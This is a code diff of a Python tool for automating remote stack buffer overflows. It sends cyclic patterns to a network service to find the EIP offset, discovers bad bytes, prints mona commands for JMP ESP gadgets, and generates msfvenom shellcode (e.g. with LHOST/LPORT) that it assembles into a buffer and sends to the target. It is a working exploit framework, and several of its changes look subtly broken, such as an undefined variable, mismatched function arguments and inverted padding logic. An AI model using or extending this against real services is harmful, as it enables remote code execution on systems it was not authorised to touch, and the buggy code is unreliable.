@@ -1,24 +1,11 @@
 #!/usr/bin/python3
 
 # TODOs
-# - Find bad chars function
-# - padding function
-# - Find EIP Address to jump to (JMP ESP)
 # - clean up command line arguments
 #   - add shorthands
 #   - add better helptexts, better formated (new lines, better explanations)
-#   - add good-eip option -> don't ask user
-#   - option to not find any additional bad chars (just use the list provided)
-#   - allow msfvenom options on cli
-#     - flag to not ask for even more options by the user (assume that those are all the options needed)
-#   - add option to save generated payload to file
 #   - add option to save generated buffer that's sent over network to file
 #     - add option to load the generated buffer (prefix, offset, EIP, payload (incl. noop), padding, postfix)
-# - add hints for !mona commands (jmp esp finder, bytearray, compare)
-# - allow user to override already existing options
-# - allow user to delete option existing (single space)
-
-
 
 
 import argparse
@@ -26,6 +13,7 @@ import sys
 import os
 import socket
 import time
+import random
 
 def main():
 	args = parse_args()
@@ -40,22 +28,20 @@ def main():
 	
 	badbytes = args.badbytes
 	
-	while True:
-		newBadByte = check_badbytes(target, badbytes, eip_offset, args)
-		if newBadByte != None:
-			if not newBadByte in badbytes:
-				badbytes += newBadByte
-			else:
-				print(f'Bad character {newBadByte} already in {badbytes}.')
-		else:
-			print('Found all bad characters.')
-			print(badbytes)
-			break
+	if not args.badbytes_known:
+		badbytes = check_badbytes(target, badbytes, eip_offset, args)
 	
+	badbytes_str = ''
+	for b in badbytes:
+		badbytes_str += '\\x' + str(hex(b))[2::]
+	print(f'Bad bytes: {badbytes_str}')
+
 	# generate buffer
 	overflow = genPattern(eip_offset, args)
 	payload = gen_payload(badbytes, args)
-	eip = getJmpESPAddr()
+	eip = args.target_eip
+	if not eip:
+		eip = getJmpESPAddr(badbytes, args)
 	buffer = args.prefix + overflow + eip + payload
 	padding = gen_padding(len(buffer) + len(args.postfix), badbytes, args)
 	buffer = buffer + padding + args.postfix
@@ -66,14 +52,106 @@ def main():
 	# pwn target
 	
 
-def getJmpESPAddr():
-	return b'\x41\x41\x42\x42'
+def getJmpESPAddr(badbytes):
+	print("Get EIP to jump to payload...")
+	if args.target_eip:
+		return args.target_eip
+	badbytes_str = ""
+	for b in badbytes:
+		badbytes_str += "\\x" + str(hex(b))[2::]
+	print(f'!mona jmp -r esp -cpb \"{badbytes_str}\"')
+	print(f'!mona find -s \'jmp esp\' -type instr -cm aslr=false,rebase=false,nx=false -cpb \"{badbytes_str}\"')
+	eip = input('Target Jump Address.\n> ')
+	eip = bytes.fromhex(eip)[::-1]
+	print(f'Target EIP: {eip}')
+	return eip
 
 def check_badbytes(target, badbytes, eip_offset, args):
-	return None
+	keepLooking = True
+	while keepLooking:
+		print(f'Known bad bytes: {badbytes}')
+		print(f'Restart target. Generate comparison bytearray:')
+		print(f'!mona bytearray 256 -b {str(badbytes)[1::]}')
+		input('Press enter when target running.')
+		# use bytearray for easy indexing
+		checkbytes = bytearray(0xFF - len(badbytes))
+		idx = 0
+		for i in range(0xFF):
+			if i in badbytes:
+				continue
+			checkbytes[idx] = i
+			idx += 1
+		# turn bytearray into bytes for sending
+		checkbytes = bytes(checkbytes)
+
+		pattern = genPattern(eip_offset, args)
+		buffer = args.prefix + pattern + args.bad_eip + checkbytes + args.postfix
+		# connect to target and send.
+		try:
+			connect_and_send(target, buffer, args)
+			# check if crashed
+			if not crashcheck(target):
+				print('Target didn\'t crash.')
+				exit(-1)
+
+			eip_hex_le_str = ''
+			for b in args.bad_eip[::-1]:
+				eip_hex_le_str += hex(b)[2::]
+
+			print(f'Target crashed. Make sure target EIP = {eip_hex_le_str}')
+			print('!mona compare -f bytearray.bin -a <ESP>')
+			h = input('Enter bad byte hex. (ex. 0A, empty if unmodified)\n> ')
+			h = int(h, 16)
+			h = hex(h)[2::]
+			if len(h) == 1:
+				h = '0' + h
+			h = bytes.fromhex(h)
+			badbytes += h
+
+		except:
+			print(sys.exc_info())
+			exit(-1)
+	return badbytes
 
 def gen_padding(length_so_far, badbytes, args):
-	return b''
+	option = args.padding
+	desired_length = args.static_length
+
+	if desired_length <= 0:
+		print('Static length disabled.')
+		return b''
+
+	if desired_length < length_so_far:
+		print('Buffer length exceeds static length.')
+		return b''
+
+	padding_length = desired_length - length_so_far
+
+	if 'NOP' == option:
+		return b'\x90' * padding_length
+	elif 'NULL' == option:
+		return b'\x00' * padding_length
+	elif 'A' == option:
+		return b'\x41' * padding_length
+	elif 'xFF' == option:
+		return b'\xFF' * padding_length
+	elif 'PTRN' == option:
+		return genPattern(padding_length, args)
+	elif 'RAND' == option:
+		# build padding from random bytes
+		padding = b''
+		while len(padding) < padding_length:
+			# keep getting random values until the value got is not in badbytes
+			# if not in badbytes, append to padding
+			keepLooking = True
+			while keepLooking:
+				rnd_byte = random.randrange(0x100)
+				keepLooking = not rnd_byte in badbytes
+				if not keepLooking:
+					padding += rnd_byte
+	else:
+		print('Unknown padding option. Unimplemented.')
+		exit(-1)
 
 def gen_payload(badbytes, args):
 	# if file was specified, skip all the nonsense.
@@ -105,7 +183,10 @@ def gen_payload(badbytes, args):
 	encoder = args.encoder_name
 	nop_count = args.nops
 	
-	options = []
+	options = {}
+
+	if args.payload_options:
+		options = args.payload_options
 	
 	msfvenom_cmd = args.msfvenom
 	
@@ -177,22 +258,31 @@ def gen_payload(badbytes, args):
 	print(cmd)
 	print(os.popen(cmd).read())	
 	
-	while True:
-		key = input('Option KEY (empty for done)\n> ')
-		if not key:
-			break
-		val = input('Option VALUE\n> ')
-		options.append((key, val))
+	if not args.payload_options:
+		while True:
+			print(f'Options: {options}')
+			key = input('Option KEY (empty for done)\n> ')
+			if not key:
+				break
+			val = input('Option VALUE (empty to unset/not set)\n> ')
+			if val.strip():
+				options[key] = val
+			elif key in options:
+				del options[key]
 	
 	# append to command
-	for kvp in options:
-		msfvenom_cmd += f' {kvp[0]}=\'{kvp[1]}\''
+	for key in options:
+		val = options[key]
+		msfvenom_cmd += f' {key}=\'{val}\''
 	
 	
 	print('Command done.')
 	print(f'{msfvenom_cmd}')
 	
 	payload_hex = os.popen(msfvenom_cmd).read()
+
+	if args.payload_out_file_hex:
+		payload_out_file_hex.write(payload_hex)
 	
 	print('-' * 20 + 'PAYLOAD HEX' + '-' * 20)
 	print(payload_hex)
@@ -214,37 +304,19 @@ def find_eip_offset(target, args):
 		inc = 1
 	# increment pattern length and send until network timeout
 	while pattern_length < args.patternmax:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		pattern_length += inc
 		print(f'Generating pattern with length {pattern_length} Bytes')
 		pattern = genPattern(pattern_length, args)
 		# connect and send
 		try:
-			print('Connecting...')
-			s.connect(target)
-			if args.banner:
-				banner = s.recv(1024)
-				length = len(banner)
-				print(f'Got banner, {length} Bytes')
-				print('-' * 12 + ' START ' + '-' * 12)
-				print(banner)
-				print('-' * 13 + ' END ' + '-' * 13)
 			buffer = args.prefix + pattern + args.postfix
-			length = len(buffer)
-			print(f'Sending {length} Bytes.')
-			print('-' * 12 + ' START ' + '-' * 12)
-			print(buffer)
-			print('-' * 13 + ' END ' + '-' * 13)
-			s.send(buffer)
-			print('Closing connection.')
-			s.close()
-			time.sleep(0.5)
+			connect_and_send(target, buffer, args)
 			# check if crashed
 			if crashcheck(target):
 				print('Target not responding anymore.')
 				eip = ""
 				while len(eip) != 8:
-					eip = input('EIP? (hex only, no 0x, no \\.)')
+					eip = input('EIP? (hex only, no 0x, no \\x, in order.)\n> ')
 				offset = findPattern(pattern_length, eip, args)
 					
 				print(f'Offset found: {offset}')
@@ -252,7 +324,8 @@ def find_eip_offset(target, args):
 		except:
 			print(sys.exc_info())
 			exit(-1)
-	return 0
+	print("Target didn't crash.")
+	exit(-1)
 
 def crashcheck(target):
 	try:
@@ -274,9 +347,7 @@ def genPattern(pattern_length, args):
 def findPattern(length, eip, args):
 	print(f'EIP-LE: {eip}')
 	# reverse, because intel is weird (little endian)
-	eip = eip[6] + eip[7] + eip[4] + eip[5] + eip[2] + eip[3] + eip[0] + eip[1]
-	print(f'EIP-BE: {eip}')
-	pattern_found = bytes.fromhex(eip).decode('ascii')
+	pattern_found = bytes.fromhex(eip).decode('ascii')[::-1]
 	print(f'Pattern: "{pattern_found}"')
 	
 	# find pattern offset
@@ -302,6 +373,27 @@ def findPattern(length, eip, args):
 	
 	return offset
 
+def connect_and_send(target, buffer, args):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	print('Connecting...')
+	s.connect(target)
+	if args.banner:
+		banner = s.recv(1024)
+		length = len(banner)
+		print(f'Got banner, {length} Bytes')
+		print('-' * 12 + ' START ' + '-' * 12)
+		print(banner)
+		print('-' * 13 + ' END ' + '-' * 13)
+	length = len(buffer)
+	print(f'Sending {length} Bytes.')
+	print('-' * 12 + ' START ' + '-' * 12)
+	print(buffer)
+	print('-' * 13 + ' END ' + '-' * 13)
+	s.send(buffer)
+	print('Closing connection.')
+	s.close()
+	time.sleep(0.5)
+
 def parse_args():
 	parser = argparse.ArgumentParser(description='Automate remote buffer overflows')
 	# target
@@ -317,11 +409,12 @@ def parse_args():
 						, help="Keep payload length static with this many Bytes. Should be more than payload length otherwise. 0 to disable."
 						, default=0, type=int)
 	parser.add_argument('--padding', dest='padding'
-						, choices=['NOP', 'NULL', 'xFF', 'RAND']
+						, choices=['NOP', 'NULL', 'A', 'xFF', 'PTRN', 'RAND']
 						, help='What is appended to the payload to get static size. Ignored if static_length is set to 0. RAND will not include bad bytes.'
-						)
+						, default='NOP')
 	parser.add_argument('--postfix', dest='postfix'
-						, help="Appended to the end of the buffer.", default='')	
+						, help="Appended to the end of the buffer.", default='')
+	parser.add_argument('--eip', dest='target_eip', help='EIP jump address')	
 	# pattern finding
 	# pattern gen
 	parser.add_argument('--pattern-increment', dest='patterninc', help='Pattern increment steps', default=100, type=int)
@@ -353,6 +446,8 @@ def parse_args():
 						, default = -1, type=int)
 	# predeterminded badchars
 	parser.add_argument('--bad-bytes', dest='badbytes', help='Known bad bytes. Ex. "\\x00\\x0A"', default='\\x00')
+	parser.add_argument('--bad-bytes-known', dest='badbytes_known', help='Don\'t look for additional bad bytes.'
+						, choices = ['True', 'False'], default='False')
 	# msfvenom
 	parser.add_argument('--venom-path', dest='msfvenom', help='Path to msfvenom', default='/usr/bin/msfvenom')
 	parser.add_argument('--payload-name', dest='payload_name', help='metasploit payload you want to use. If not set program will ask you.')
@@ -363,17 +458,35 @@ def parse_args():
 	parser.add_argument('--encoding-iter', dest='encoding_iter', help='How many iterations of encoding to use.', type=int)
 	parser.add_argument('--payload-file-bin', dest='payload_file_bin', help='File where the payload is stored in raw bytes.', type=argparse.FileType('rb'))
 	parser.add_argument('--payload-file-hex', dest='payload_file_hex', help='File where the payload is stored in hex.', type=argparse.FileType('r'))
+	parser.add_argument('--payload-output-file-hex', dest='payload_out_file_hex', help='File where the payload will be stored in hex.', type=argparse.FileType('w'))
+	parser.add_argument('--payload-options', dest='payload_options', help='Hash (#) separated list of options. If set no other options will be asked for. \'LHOST=127.0.0.1#LPORT=4444,...\'')
 	# parse arguments
 	args = parser.parse_args()
 	
 	# fix types
 	args.banner = (args.banner == 'True')
+	args.badbytes_known = (badbytes_known == 'True')
 	
-	# fix bytes arguments for prefix, postfix, bad_eip, badbytes
+	# fix bytes arguments for prefix, postfix, target_eip, bad_eip, badbytes
 	args.prefix = string_to_bytes(args.prefix)
 	args.postfix = string_to_bytes(args.postfix)
 	args.bad_eip = string_to_bytes(args.bad_eip)
 	args.badbytes = string_to_bytes(args.badbytes)
+	args.target_eip = string_to_bytes(args.target_eip)
+
+	# fix list
+	if args.payload_options:
+		payload_options = {}
+		for str in args.payload_options.split('#'):
+			arr = str.split('=')
+			if len(arr) != 2:
+				print(f"Ill formatted payload option. {str}")
+				exit(1)
+			key = arr[0].strip()
+			val = arr[1].strip()
+			payload_options[key] = val
+		args.payload_options = payload_options
+
 	return args
 
 def string_to_bytes(string):
